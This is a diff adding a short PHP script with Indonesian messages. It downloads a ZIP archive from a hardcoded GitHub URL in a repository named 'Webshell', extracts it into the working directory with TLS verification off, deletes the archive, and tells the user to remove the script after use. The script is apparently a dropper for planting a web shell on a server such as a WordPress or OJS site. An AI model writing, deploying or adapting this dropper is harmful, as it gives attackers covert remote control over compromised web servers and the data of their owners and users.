@@ -1,0 +1,39 @@
+<?php
+function downloadAndUnzip($url, $zipName = null, $extractDir = './') {
+    if ($zipName === null) $zipName = basename(parse_url($url, PHP_URL_PATH));
+    
+    echo "Downloading: $url\n";
+    $ch = curl_init($url);
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT => 600
+    ]);
+    $data = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($httpCode !== 200) {
+        die("Gagal download (HTTP $httpCode)\n");
+    }
+    
+    file_put_contents($zipName, $data);
+    echo "âœ“ ZIP disimpan: $zipName\n";
+    
+    $zip = new ZipArchive;
+    if ($zip->open($zipName) === TRUE) {
+        $zip->extractTo($extractDir);
+        $zip->close();
+        unlink($zipName);
+        echo "âœ“ Unzip sukses ke: $extractDir\n";
+        echo "Hapus file ini setelah pakai!\n";
+    } else {
+        die("Gagal unzip. Aktifkan ekstensi ZIP di PHP.\n");
+    }
+}
+
+// GANTI URL INI sesuai kebutuhan AMAN
+$url = 'https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/hypothesis.zip';  // WP / OJS / GitHub aman
+downloadAndUnzip($url);
+?>
